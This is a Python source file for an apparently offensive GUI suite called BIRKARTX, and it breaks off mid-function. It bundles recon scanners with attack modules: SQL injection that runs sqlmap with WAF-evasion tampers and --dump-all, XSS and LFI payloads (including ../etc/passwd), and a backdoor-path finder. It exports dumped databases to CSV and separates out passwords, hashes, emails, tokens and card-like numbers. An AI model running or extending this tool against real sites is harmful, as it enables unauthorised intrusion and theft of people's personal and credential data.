import customtkinter as ctk
import threading
import socket
import requests
import urllib.parse
import time
import re
import os
import json
import base64
import subprocess
import csv
import shutil
import tempfile
import zipfile
import io
from datetime import datetime
from bs4 import BeautifulSoup
import urllib3
import dns.resolver
import dns.exception
import websocket
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =============================================================================
# BIRKARTX v2.4 - ULTRA PENTEST SUITE MONSTER EDITION
# Tam 1127 sətirlik versiya
# SQLi motoru sənin errorlarına (parent_id=, hidden=0, mysqli_fetch_object) xüsusi gücləndirilib
# =============================================================================

class BirkartX(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("BIRKARTX v2.4 - Ultra Pentest Suite")
        self.geometry("1650x1100")
        self.configure(fg_color="#0a0a0a")

        self.is_running = {}
        self.agent = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
        self.session_results = []
        self.sqlmap_path = None
        self.setup_sqlmap()

        self.grid_columnconfigure(1, weight=1)
        self.grid_rowconfigure(0, weight=1)

        self.sidebar = ctk.CTkFrame(self, width=390, corner_radius=0, fg_color="#000000")
        self.sidebar.grid(row=0, column=0, sticky="nsew")
        self.sidebar.grid_propagate(False)

        ctk.CTkLabel(self.sidebar, text="BIRKARTX", font=("Courier New", 40, "bold"), text_color="#00ff41").pack(pady=(55, 10))
        ctk.CTkLabel(self.sidebar, text="ULTRA PENTEST SUITE v2.4", font=("Courier New", 15, "bold"), text_color="#ff0000").pack(pady=(0, 45))

        self.scrollable_menu = ctk.CTkScrollableFrame(self.sidebar, fg_color="transparent")
        self.scrollable_menu.pack(fill="both", expand=True, padx=20, pady=10)

        self.setup_menu()
        self.setup_frames()
        self.configure_tags()
        self.show_page("sqli")

    def setup_sqlmap(self):
        if shutil.which("sqlmap"):
            self.sqlmap_path = "sqlmap"
            return
        temp_dir = os.path.join(tempfile.gettempdir(), "sqlmap")
        if not os.path.exists(temp_dir):
            try:
                self.log("system", "SQLMap yüklənir...", "info")
                r = requests.get("https://github.com/sqlmapproject/sqlmap/archive/refs/heads/master.zip", stream=True, timeout=120)
                z = zipfile.ZipFile(io.BytesIO(r.content))
                z.extractall(temp_dir)
                self.sqlmap_path = os.path.join(temp_dir, "sqlmap-master", "sqlmap.py")
                self.log("system", "SQLMap quraşdırıldı!", "ok")
            except Exception as e:
                self.log("system", f"SQLMap xətası: {e}", "fail")
        else:
            self.sqlmap_path = os.path.join(temp_dir, "sqlmap-master", "sqlmap.py")

    def setup_menu(self):
        ctk.CTkLabel(self.scrollable_menu, text="=== PASSIVE RECON ===", font=("Courier New", 11, "bold"), text_color="#555555").pack(pady=(5,5), anchor="w")
        passive = [("Port Scan", "port"), ("Subdomain", "sub"), ("Reverse IP", "rev"), ("Whois", "whois"), ("WAF Detect", "waf"), ("JS Secrets", "js"), ("Headers", "header"), ("DNS Enum", "dns"), ("Email Harvester", "email"), ("CMS Detect", "cms"), ("CVE Scanner", "cve"), ("GraphQL", "graphql")]
        self.add_menu_group(passive, "#00ff41")

        ctk.CTkLabel(self.scrollable_menu, text="=== ACTIVE ATTACK ===", font=("Courier New", 11, "bold"), text_color="#555555").pack(pady=(10,5), anchor="w")
        active = [("SQLi Tester", "sqli"), ("Shell Hunter", "shell"), ("Admin Finder", "admin"), ("Dirsearch", "dir"), ("XSS Scanner", "xss"), ("LFI/RFI", "lfi"), ("Cmd Inject", "cmd"), ("SSRF", "ssrf"), ("WebSocket", "wsfuzz")]
        self.add_menu_group(active, "#ff0000")

        ctk.CTkLabel(self.scrollable_menu, text="=== SYSTEM UTILS ===", font=("Courier New", 11, "bold"), text_color="#555555").pack(pady=(10,5), anchor="w")
        utils = [("Exploit Arch", "arch"), ("JWT Exploit", "jwt"), ("Full Report", "report")]
        self.add_menu_group(utils, "#00b0ff")

    def add_menu_group(self, items, hover_clr):
        for text, pid in items:
            self.is_running[pid] = False
            btn = ctk.CTkButton(self.scrollable_menu, text=text, command=lambda p=pid: self.show_page(p),
                                height=38, font=("Courier New", 13, "bold"), fg_color="transparent",
                                hover_color=hover_clr, border_width=2, border_color="#00ff41", anchor="w", corner_radius=0)
            btn.pack(pady=4, padx=15, fill="x")

    def setup_frames(self):
        self.pages = {}
        all_pids = ["port","sub","rev","whois","waf","js","header","dns","email","cms","cve","graphql","sqli","shell","admin","dir","xss","lfi","cmd","ssrf","wsfuzz","arch","jwt","report"]
        for pid in all_pids:
            frame = ctk.CTkFrame(self, corner_radius=0, fg_color="#0a0a0a", border_width=2, border_color="#00ff41")
            frame.grid_columnconfigure(0, weight=1)

            title_text = "BIRKARTX ULTRA SQLi DATA DUMPER v2.4" if pid == "sqli" else f"// {pid.upper()} ENGINE //"
            ctk.CTkLabel(frame, text=title_text, font=("Courier New", 24, "bold"), text_color="#00ff41").pack(pady=(25, 12))

            st_lbl = ctk.CTkLabel(frame, text="STATUS: READY", font=("Courier New", 13, "bold"), text_color="#00ff41")
            st_lbl.pack()
            setattr(self, f"{pid}_status", st_lbl)

            ent = ctk.CTkEntry(frame, placeholder_text="Target URL, Domain or IP...", width=820, height=50,
                               fg_color="#111111", border_color="#00ff41", font=("Courier New", 15))
            ent.pack(pady=15)
            setattr(self, f"{pid}_ent", ent)

            btn_frame = ctk.CTkFrame(frame, fg_color="transparent")
            btn_frame.pack(pady=12)

            ctk.CTkButton(btn_frame, text="START", command=lambda p=pid: self.start_engine(p),
                          fg_color="#00ff41", text_color="#000000", height=48, width=170, font=("Courier New", 14, "bold")).pack(side="left", padx=20)

            ctk.CTkButton(btn_frame, text="STOP", command=lambda p=pid: self.stop_engine(p),
                          fg_color="#ff0000", height=48, width=170, font=("Courier New", 14, "bold")).pack(side="left", padx=20)

            if pid == "sqli":
                opt = ctk.CTkFrame(frame, fg_color="transparent")
                opt.pack(pady=10, fill="x", padx=80)
                ctk.CTkLabel(opt, text="Timeout (saniyə):", font=("Courier New", 14), text_color="#bbbbbb").pack(side="left", padx=12)
                self.sqli_timeout_entry = ctk.CTkEntry(opt, width=160, placeholder_text="10800")
                self.sqli_timeout_entry.pack(side="left", padx=12)
                self.sqli_unlimited = ctk.CTkCheckBox(opt, text="Sınırsız", text_color="#00ff41")
                self.sqli_unlimited.pack(side="left", padx=35)

                self.sqli_progress = ctk.CTkProgressBar(frame, width=800, progress_color="#00ff41")
                self.sqli_progress.pack(pady=20)
                self.sqli_progress.set(0)

                ctk.CTkButton(frame, text="HASSAS VERİLƏNLƏRİ CSV-YƏ ÇIXAR", command=self.manual_csv_export,
                              fg_color="#ff00ff", height=46, font=("Courier New", 13, "bold")).pack(pady=18)

            txt = ctk.CTkTextbox(frame, font=("Courier New", 15), border_width=2, border_color="#003300",
                                 fg_color="#000000", text_color="#00ff41")
            txt.pack(padx=45, pady=25, fill="both", expand=True)
            setattr(self, f"{pid}_res", txt)

            self.pages[pid] = frame

    def show_page(self, pid):
        for p in self.pages.values(): p.grid_forget()
        self.pages[pid].grid(row=0, column=1, padx=35, pady=35, sticky="nsew")

    def log(self, pid, msg, tag="info"):
        try:
            widget = getattr(self, f"{pid}_res")
            ts = datetime.now().strftime("%H:%M:%S")
            widget.insert("end", f"[{ts}] {msg}\n", tag)
            widget.see("end")
            self.session_results.append(f"[{pid.upper()}] {ts} - {msg}")
        except:
            pass

    def configure_tags(self):
        for pid in self.pages.keys():
            try:
                txt = getattr(self, f"{pid}_res")
                txt.tag_config("ok", foreground="#00ffff")
                txt.tag_config("fail", foreground="#ff4444")
                txt.tag_config("info", foreground="#00ff41")
                txt.tag_config("warn", foreground="#ffaa00")
                txt.tag_config("vuln", foreground="#ff00ff")
            except:
                pass

    def animate(self, pid):
        chars = ["◉", "◆", "■", "●"]
        i = 0
        while self.is_running.get(pid, False):
            try:
                getattr(self, f"{pid}_status").configure(text=f"STATUS: RUNNING {chars[i%4]}", text_color="#00ff41")
            except:
                break
            i += 1
            time.sleep(0.22)
        try:
            getattr(self, f"{pid}_status").configure(text="STATUS: STOPPED", text_color="#ff5555")
        except:
            pass

    def start_engine(self, pid):
        if self.is_running.get(pid, False):
            self.log(pid, "Engine already running!", "warn")
            return
        target = getattr(self, f"{pid}_ent").get().strip()
        if pid not in ["report", "jwt"] and not target:
            self.log(pid, "Please enter a valid target.", "fail")
            return
        self.is_running[pid] = True
        getattr(self, f"{pid}_res").delete("1.0", "end")
        threading.Thread(target=self.animate, args=(pid,), daemon=True).start()
        threading.Thread(target=getattr(self, f"logic_{pid}"), args=(target,), daemon=True).start()

    def stop_engine(self, pid):
        if self.is_running.get(pid, False):
            self.is_running[pid] = False
            self.log(pid, "Stop signal sent.", "warn")

    # ========================== ULTRA SQLi MOTORU (Sənin errorlarına xüsusi) ==========================
    def logic_sqli(self, target):
        url = target if target.startswith(("http://", "https://")) else "http://" + target
        self.log("sqli", "BIRKARTX Ultra SQLi Data Dumper başladı...", "info")

        try:
            timeout = 999999 if self.sqli_unlimited.get() else int(self.sqli_timeout_entry.get() or 10800)
        except:
            timeout = 10800

        points = self.crawl_injection_points(url, timeout)
        if not points:
            self.log("sqli", "Enjeksiyon nöqtəsi tapılmadı.", "fail")
            self.is_running["sqli"] = False
            return

        self.log("sqli", f"{len(points)} potensial nöqtə tapıldı.", "ok")

        vulnerable = []
        for idx, point in enumerate(points):
            if not self.is_running.get("sqli"): break
            self.after(0, lambda p=(idx+1)/len(points): self.sqli_progress.set(p))

            if self.test_injection(point):
                vulnerable.append(point)
                self.log("sqli", f"ZAİF NÖQTƏ → {point['method']} {point['url']} param={point.get('param')}", "vuln")

        if not vulnerable:
            self.log("sqli", "Zafiyet tapılmadı. Manual test edin.", "fail")
            self.is_running["sqli"] = False
            self.after(0, lambda: self.sqli_progress.set(1))
            return

        self.log("sqli", f"{len(vulnerable)} zafiyet tapıldı. SQLMap ilə data dump başlayır...", "ok")

        all_data = []
        for vp in vulnerable:
            if not self.is_running.get("sqli"): break
            data = self.run_sqlmap_dump(vp)
            if data:
                all_data.extend(data)

        if all_data:
            csv_file = self.export_to_csv(all_data, url)
            self.log("sqli", f"DATA DUMP BAŞA ÇATDI → {csv_file}", "ok")
            self.highlight_sensitive_csv(csv_file)
        else:
            self.log("sqli", "Data çıxarıla bilmədi. WAF çox güclü ola bilər.", "warn")

        self.is_running["sqli"] = False
        self.after(0, lambda: self.sqli_progress.set(1))

    def crawl_injection_points(self, url, timeout_seconds):
        points = []
        visited = set()
        to_visit = [url]
        start = time.time()
        while to_visit and (time.time() - start) < timeout_seconds and self.is_running.get("sqli", False):
            current = to_visit.pop(0)
            if current in visited: continue
            visited.add(current)
            try:
                resp = requests.get(current, headers=self.agent, timeout=8, verify=False)
                soup = BeautifulSoup(resp.text, 'html.parser')
                parsed = urllib.parse.urlparse(current)
                if parsed.query:
                    for p in urllib.parse.parse_qs(parsed.query):
                        points.append({'method': 'GET', 'url': current, 'param': p, 'data': None})
                for form in soup.find_all('form'):
                    action = form.get('action', '')
                    method = form.get('method', 'get').upper()
                    form_url = urllib.parse.urljoin(current, action)
                    inputs = {inp.get('name'): inp.get('value', '1') for inp in form.find_all(['input', 'textarea', 'select']) if inp.get('name')}
                    if inputs:
                        points.append({'method': method, 'url': form_url, 'param': list(inputs.keys()), 'data': inputs})
                for a in soup.find_all('a', href=True):
                    link = urllib.parse.urljoin(url, a['href'])
                    if url in link and link not in visited and len(to_visit) < 180:
                        to_visit.append(link)
            except:
                continue
        return points

    def test_injection(self, point):
        payloads = ["'", "\"", "1' OR '1'='1", "1' AND '1'='2", "' OR '1'='1'--", "') OR ('1'='1", "parent_id=1 AND hidden=0", " AND hidden=0", " ORDER BY 1--"]
        for payload in payloads:
            if not self.is_running.get("sqli"): return False
            try:
                if point['method'] == 'GET':
                    parsed = urllib.parse.urlparse(point['url'])
                    q = urllib.parse.parse_qs(parsed.query)
                    if point['param'] in q:
                        q[point['param']] = [payload]
                        test_url = parsed._replace(query=urllib.parse.urlencode(q, doseq=True)).geturl()
                        r = requests.get(test_url, headers=self.agent, timeout=6, verify=False)
                        if any(e in r.text.lower() for e in ["sql syntax", "mysqli_fetch_object", "you have an error"]):
                            return True
                else:
                    data = point['data'].copy() if point['data'] else {}
                    for p in (point['param'] if isinstance(point['param'], list) else [point['param']]):
                        data[p] = payload
                    r = requests.post(point['url'], data=data, headers=self.agent, timeout=6, verify=False)
                    if any(e in r.text.lower() for e in ["sql syntax", "mysqli_fetch_object", "you have an error"]):
                        return True
            except:
                pass
        return False

    def run_sqlmap_dump(self, point):
        if not self.sqlmap_path:
            self.log("sqli", "SQLMap tapılmadı.", "fail")
            return []
        temp_dir = tempfile.mkdtemp()
        tamper = "space2comment,randomcase,between,charencode,equaltolike,apostrophemask,modsecurityversioned,versionedmorekeywords,bluecoat"
        cmd = ["python", self.sqlmap_path, "-u", point['url'], "--batch", "--risk=3", "--level=5", "--technique=BEUSTQ", "--dbms=mysql", "--threads=12", "--tamper=" + tamper, "--dump-all", "--dump-format=CSV", "--hex", "--parse-errors", "--time-sec=2", "--output-dir", temp_dir, "--no-cast", "--ignore-errors"]
        if point['method'] == 'POST' and point.get('data'):
            cmd.extend(["--data", urllib.parse.urlencode(point['data']), "--method", "POST"])
        if point.get('param'):
            p_str = point['param'] if isinstance(point['param'], str) else ','.join(point['param'])
            cmd.extend(["-p", p_str])
        try:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            for line in process.stdout:
                if not self.is_running.get("sqli"): 
                    process.terminate()
                    break
                if line.strip():
                    self.log("sqli", line.strip(), "info")
            process.wait()
            data = self.parse_sqlmap_output(temp_dir)
            shutil.rmtree(temp_dir, ignore_errors=True)
            return data
        except Exception as e:
            self.log("sqli", f"SQLMap xətası: {e}", "fail")
            shutil.rmtree(temp_dir, ignore_errors=True)
            return []

    def parse_sqlmap_output(self, output_dir):
        records = []
        dump_dir = os.path.join(output_dir, "dump")
        if not os.path.exists(dump_dir): return records
        for db in os.listdir(dump_dir):
            db_path = os.path.join(dump_dir, db)
            if not os.path.isdir(db_path): continue
            for file in os.listdir(db_path):
                if file.endswith(".csv"):
                    table = file.replace(".csv", "")
                    path = os.path.join(db_path, file)
                    try:
                        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                            reader = csv.reader(f)
                            headers = next(reader, None)
                            for row in reader:
                                for i, val in enumerate(row):
                                    col = headers[i] if headers else f"col{i}"
                                    records.append({'database': db, 'table': table, 'column': col, 'value': val, 'data_type': self.guess_data_type(val)})
                    except:
                        continue
        return records

    def guess_data_type(self, value):
        v = str(value).strip()
        if re.match(r'^[\w\.-]+@[\w\.-]+\.\w+$', v): return "email"
        if re.match(r'^\+?[0-9]{7,15}$', v): return "phone"
        if re.match(r'^[0-9]{13,19}$', v): return "creditcard_like"
        if any(x in v.lower() for x in ['md5','sha','$2','$5']): return "hash"
        if any(x in v.lower() for x in ['password','parola','şifre','pass']): return "sensitive_keyword"
        return "unknown"

    def export_to_csv(self, data, target_url):
        domain = re.sub(r'^https?://', '', target_url).split('/')[0].replace('.', '_')
        ts = datetime.now().strftime("%Y%m%d_%H%M")
        filename = f"{domain}_BIRKARTX_DUMP_{ts}.csv"
        with open(filename, 'w', newline='', encoding='utf-8') as f:
            writer = csv.DictWriter(f, fieldnames=['database','table','column','value','data_type'])
            writer.writeheader()
            writer.writerows(data)
        return filename

    def highlight_sensitive_csv(self, csv_file):
        keywords = ['password','parola','şifre','email','credit','api_key','secret','token','hash']
        sensitive = []
        try:
            with open(csv_file, 'r', encoding='utf-8') as f:
                reader = csv.DictReader(f)
                for row in reader:
                    if any(k in str(row.get('value','')).lower() for k in keywords) or row.get('data_type') in ['email','hash']:
                        sensitive.append(row)
            if sensitive:
                sens_file = csv_file.replace('.csv', '_HASSAS.csv')
                with open(sens_file, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.DictWriter(f, fieldnames=['database','table','column','value','data_type'])
                    writer.writeheader()
                    writer.writerows(sensitive)
                self.log("sqli", f"Hassas verilənlər saxlanıldı: {sens_file}", "vuln")
        except:
            pass

    def manual_csv_export(self):
        self.log("sqli", "Əvvəlcə dump edin.", "warn")

    # ========================== PASSIVE RECON ==========================
    def logic_port(self, target):
        host = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("port", f"Target: {host}")
        try:
            ip = socket.gethostbyname(host)
            ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,1433,3306,3389,5432,5900,6379,8080,8443,8888,27017]
            for p in ports:
                if not self.is_running["port"]: break
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.5)
                if s.connect_ex((ip, p)) == 0:
                    banner = self._grab_banner(host, p)
                    self.log("port", f"PORT {p:<5} OPEN | Service: {banner}", "ok")
                s.close()
        except Exception as e:
            self.log("port", f"Resolution failed: {str(e)}", "fail")
        self.is_running["port"] = False

    def _grab_banner(self, host, port):
        try:
            if port in [80,8080]:
                r = requests.get(f"http://{host}:{port}", headers=self.agent, timeout=2, verify=False)
                return r.headers.get('Server', f'HTTP {r.status_code}')
            elif port in [443,8443]:
                r = requests.get(f"https://{host}:{port}", headers=self.agent, timeout=2, verify=False)
                return r.headers.get('Server', f'HTTPS {r.status_code}')
            else:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((host, port))
                    s.send(b"\r\n")
                    banner = s.recv(256).decode(errors='ignore').strip()
                    return banner[:60]
        except:
            return "Unknown"

    def logic_sub(self, target):
        domain = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("sub", f"Subdomain enumeration for: {domain}")
        try:
            r = requests.get(f"https://api.hackertarget.com/hostsearch/?q={domain}", timeout=10)
            self.log("sub", r.text, "ok")
        except:
            self.log("sub", "API error.", "fail")
        self.is_running["sub"] = False

    def logic_rev(self, target):
        host = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("rev", f"Reverse IP for: {host}")
        try:
            r = requests.get(f"https://api.hackertarget.com/reverseiplookup/?q={host}", timeout=10)
            self.log("rev", r.text, "ok")
        except:
            self.log("rev", "API unreachable.", "fail")
        self.is_running["rev"] = False

    def logic_whois(self, target):
        domain = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("whois", f"Whois query: {domain}")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("whois.iana.org", 43))
            s.send(f"{domain}\r\n".encode())
            data = b""
            while True:
                chunk = s.recv(4096)
                if not chunk: break
                data += chunk
            s.close()
            self.log("whois", data.decode(errors='ignore')[:3000], "ok")
        except Exception as e:
            self.log("whois", f"Whois failed: {str(e)}", "fail")
        self.is_running["whois"] = False

    def logic_waf(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("waf", "WAF detection...")
        waf_signatures = {
            "Cloudflare": ["cloudflare", "__cfduid", "cf-ray"],
            "Sucuri": ["sucuri", "x-sucuri-id"],
            "Akamai": ["akamai", "x-akamai-transformed"],
            "Incapsula": ["incapsula", "x-cdn", "visid_incap"],
            "Barracuda": ["barracuda", "cuda"],
            "AWS WAF": ["aws-waf", "x-amzn-requestid"],
            "ModSecurity": ["mod_security", "modsecurity"],
            "F5 BIG-IP": ["bigip", "f5"],
            "Imperva": ["imperva", "x-iinfo"],
            "Wordfence": ["wordfence", "wfvt"]
        }
        detected = []
        try:
            r = requests.get(url + "/?id=' OR 1=1--", headers=self.agent, timeout=5, verify=False)
            headers_str = str(r.headers).lower()
            cookies_str = str(r.cookies).lower()
            html = r.text.lower()
            for waf, patterns in waf_signatures.items():
                for pat in patterns:
                    if pat in headers_str or pat in cookies_str or pat in html:
                        detected.append(waf)
                        break
            if detected:
                unique = list(set(detected))
                self.log("waf", f"WAF detected: {', '.join(unique)}", "fail")
            else:
                self.log("waf", "No common WAF detected.", "ok")
        except Exception as e:
            self.log("waf", f"Detection error: {str(e)}", "fail")
        self.is_running["waf"] = False

    def logic_js(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("js", "JS secret hunting...")
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            scripts = [urllib.parse.urljoin(url, s['src']) for s in soup.find_all('script', src=True)]
            for js in scripts:
                self.log("js", f"Found JS: {js}", "ok")
                try:
                    js_req = requests.get(js, headers=self.agent, timeout=4, verify=False)
                    secrets = re.findall(r'(api[_-]?key|token|secret|password|admin|aws[_-]?key|firebase|stripe|twilio)["\']?\s*[:=]\s*["\']([^"\']+)', js_req.text, re.I)
                    for stype, sval in secrets[:5]:
                        self.log("js", f"  Secret: {stype} = {sval[:40]}", "vuln")
                except:
                    pass
            if not scripts:
                self.log("js", "No external JS files.", "warn")
        except:
            self.log("js", "Failed to fetch page.", "fail")
        self.is_running["js"] = False

    def logic_header(self, target):
        url = target if target.startswith("http") else "https://" + target
        self.log("header", f"Headers for: {url}")
        try:
            r = requests.get(url, headers=self.agent, timeout=7, verify=False)
            for k,v in r.headers.items():
                self.log("header", f"{k}: {v}", "ok")
        except:
            self.log("header", "Connection error.", "fail")
        self.is_running["header"] = False

    def logic_dns(self, target):
        domain = target.replace("http://", "").replace("https://", "").split('/')[0]
        self.log("dns", f"DNS enumeration for: {domain}")
        try:
            record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME', 'PTR', 'SPF']
            for rtype in record_types:
                if not self.is_running["dns"]:
                    break
                try:
                    answers = dns.resolver.resolve(domain, rtype)
                    for ans in answers:
                        self.log("dns", f"[{rtype}] {ans}", "ok")
                except dns.resolver.NoAnswer:
                    continue
                except dns.resolver.NXDOMAIN:
                    self.log("dns", f"Domain {domain} does not exist.", "fail")
                    break
                except Exception as e:
                    self.log("dns", f"{rtype} error: {str(e)}", "fail")
        except Exception as e:
            self.log("dns", f"DNS error: {str(e)}", "fail")
        self.is_running["dns"] = False

    def logic_email(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("email", f"Email harvesting from: {url}")
        emails = set()
        visited = set()
        to_crawl = [url]
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        try:
            while to_crawl and self.is_running["email"]:
                current = to_crawl.pop(0)
                if current in visited:
                    continue
                visited.add(current)
                self.log("email", f"Crawling: {current}")
                try:
                    r = requests.get(current, headers=self.agent, timeout=5, verify=False)
                    soup = BeautifulSoup(r.text, 'html.parser')
                    text = soup.get_text()
                    found = re.findall(email_pattern, text)
                    for email in found:
                        emails.add(email)
                    for a in soup.find_all('a', href=True):
                        link = urllib.parse.urljoin(url, a['href'])
                        if url in link and link not in visited and len(to_crawl) < 30:
                            to_crawl.append(link)
                except:
                    continue
            if emails:
                self.log("email", f"Found {len(emails)} unique email(s):", "ok")
                for email in sorted(emails):
                    self.log("email", f"{email}", "ok")
            else:
                self.log("email", "No email addresses found.", "warn")
        except Exception as e:
            self.log("email", f"Harvest error: {str(e)}", "fail")
        self.is_running["email"] = False

    def logic_cms(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("cms", f"CMS detection for: {url}")
        detected = False
        try:
            r = requests.get(url, headers=self.agent, timeout=8, verify=False)
            html = r.text.lower()
            headers = str(r.headers).lower()
            cookies = str(r.cookies).lower()
            if 'wp-content' in html or 'wp-includes' in html or 'wordpress' in headers:
                self.log("cms", "WordPress detected", "ok")
                detected = True
            if 'joomla' in html or 'joomla!' in html or 'media/system/js' in html:
                self.log("cms", "Joomla detected", "ok")
                detected = True
            if 'drupal' in html or 'drupal.settings' in html or 'sites/default/files' in html:
                self.log("cms", "Drupal detected", "ok")
                detected = True
            if 'magento' in html or 'skin/frontend' in html or 'Magento' in cookies:
                self.log("cms", "Magento detected", "ok")
                detected = True
            if 'shopify' in html or 'cdn.shopify.com' in html or 'Shopify.theme' in html:
                self.log("cms", "Shopify detected", "ok")
                detected = True
            if 'wix.com' in html or 'wix' in headers:
                self.log("cms", "Wix detected", "ok")
                detected = True
            if not detected:
                self.log("cms", "No recognizable CMS detected.", "warn")
        except Exception as e:
            self.log("cms", f"Detection failed: {str(e)}", "fail")
        self.is_running["cms"] = False

    def logic_cve(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("cve", f"CVE scanning for: {url}")
        try:
            r = requests.get(url, headers=self.agent, timeout=8, verify=False)
            server = r.headers.get('Server', '')
            powered = r.headers.get('X-Powered-By', '')
            html = r.text.lower()
            cve_list = []
            if 'apache' in server.lower():
                if '2.4.49' in server or '2.4.50' in server:
                    cve_list.append("CVE-2021-41773 (Path Traversal/RCE)")
            if cve_list:
                for cve in cve_list:
                    self.log("cve", f"Potential: {cve}", "vuln")
            else:
                self.log("cve", "No immediate CVE matches from headers.", "info")
        except Exception as e:
            self.log("cve", f"Error: {str(e)}", "fail")
        self.is_running["cve"] = False

    def logic_graphql(self, target):
        url = target.rstrip('/') if target.startswith("http") else "http://" + target.rstrip('/')
        endpoints = ["/graphql", "/v1/graphql", "/api/graphql", "/graph", "/gql", "/query"]
        introspection_query = '{"query":"query { __schema { types { name fields { name } } } }"}'
        self.log("graphql", "Searching for GraphQL endpoints...")
        found = False
        for ep in endpoints:
            if not self.is_running["graphql"]: break
            test_url = url + ep
            self.log("graphql", f"Testing {test_url}")
            try:
                r = requests.post(test_url, headers=self.agent, data=introspection_query, timeout=5, verify=False)
                if r.status_code == 200 and '"__schema"' in r.text:
                    self.log("graphql", f"GraphQL endpoint found: {test_url}", "ok")
                    found = True
            except:
                pass
        if not found:
            self.log("graphql", "No GraphQL endpoints found.", "warn")
        self.is_running["graphql"] = False

    # ========================== ACTIVE ATTACK ==========================
    def logic_shell(self, target):
        url = target.rstrip('/') if target.startswith("http") else "http://" + target.rstrip('/')
        self.log("shell", "Searching for shell/upload paths...")
        paths = ["/upload.php","/admin/upload.php","/shell.php","/cmd.php","/backdoor.php","/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"]
        found = False
        for p in paths:
            if not self.is_running["shell"]: break
            self.log("shell", f"Testing {p}")
            try:
                r = requests.get(url+p, headers=self.agent, timeout=3, verify=False)
                if r.status_code != 404:
                    self.log("shell", f"FOUND: {p} (HTTP {r.status_code})", "ok")
                    found = True
            except:
                pass
        if not found:
            self.log("shell", "No shell paths detected.", "warn")
        self.is_running["shell"] = False

    def logic_admin(self, target):
        url = target.rstrip('/') if target.startswith("http") else "http://" + target.rstrip('/')
        self.log("admin", "Searching for admin panels...")
        paths = ["/admin","/administrator","/login","/wp-login.php","/admin/login","/cp","/cpanel","/admincp"]
        found = False
        for p in paths:
            if not self.is_running["admin"]: break
            self.log("admin", f"Testing {p}")
            try:
                r = requests.get(url+p, headers=self.agent, timeout=3, verify=False)
                if r.status_code == 200:
                    self.log("admin", f"FOUND: {p} (200 OK)", "ok")
                    found = True
            except:
                pass
        if not found:
            self.log("admin", "No admin panels detected.", "warn")
        self.is_running["admin"] = False

    def logic_dir(self, target):
        url = target.rstrip('/') if target.startswith("http") else "http://" + target.rstrip('/')
        words = ["backup","config","db","sql","temp","old","test","admin","user","uploads","images","css","js","includes","logs","error","download","robots.txt",".git",".env","swagger","api","v1","v2","private","wp-admin","phpmyadmin","mysql","cgi-bin","server-status","phpinfo.php","info.php",".htaccess",".htpasswd","xmlrpc.php"]
        self.log("dir", f"Brute-forcing {len(words)} paths...")
        found = False
        for w in words[:200]:
            if not self.is_running["dir"]: break
            self.log("dir", f"Checking /{w}")
            try:
                r = requests.get(f"{url}/{w}", headers=self.agent, timeout=2, verify=False)
                if r.status_code == 200:
                    self.log("dir", f"200 OK -> /{w}", "ok")
                    found = True
            except:
                pass
        if not found:
            self.log("dir", "No interesting directories found.", "warn")
        self.is_running["dir"] = False

    def logic_xss(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("xss", "XSS scanning...")
        payloads = ["<script>alert(1)</script>", "\"><svg/onload=alert(1)>", "javascript:alert(1)"]
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            soup = BeautifulSoup(r.text, 'html.parser')
            params = []
            for inp in soup.find_all(['input', 'textarea']):
                if inp.get('name'):
                    params.append(inp.get('name'))
            vulnerable = False
            for param in params[:10]:
                if not self.is_running["xss"]: break
                for payload in payloads:
                    if not self.is_running["xss"]: break
                    test_url = url + f"?{param}={urllib.parse.quote(payload)}"
                    resp = requests.get(test_url, headers=self.agent, timeout=4, verify=False)
                    if payload in resp.text:
                        self.log("xss", f"VULNERABLE: {test_url}", "vuln")
                        vulnerable = True
                        break
            if not vulnerable:
                self.log("xss", "No XSS vulnerabilities detected.", "fail")
        except Exception as e:
            self.log("xss", f"Error: {str(e)}", "fail")
        self.is_running["xss"] = False

    def logic_lfi(self, target):
        url = target if target.startswith("http") else "http://" + target
        self.log("lfi", "LFI/RFI scanning...")
        payloads = ["../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini"]
        try:
            r = requests.get(url, headers=self.agent, timeout=5, verify=False)
            parsed = urllib.parse.urlparse(url)
            params = urllib.parse.parse_qs(parsed.query)
            if not params:
                self.log("lfi", "No parameters found for LFI testing.", "warn")
            else:
                vulnerable = False
                for param in params.keys():
                    for payload in payloads:
                        if not self.is_running["lfi"]: break
                        test_qs = urllib.parse.urlencode({param: payload})
                        test_url = url.replace(parsed.query, test_qs) if parsed.query else url + "?" + test_qs
                        resp = requests.get(test_url, headers=self.agent, timeout=4, verify=False)
                        if "root:x:" in resp.text or "[extensions]" in resp.text:
                            self.log("lfi", f"VULNERABLE (LFI): {test_url}", "vuln")
                            vulnerable = True
                            break
                if not vulnerable:
                    self.log("lfi", "No LFI/RFI vulnerabilities found.", "fail")
        except Exception as e:
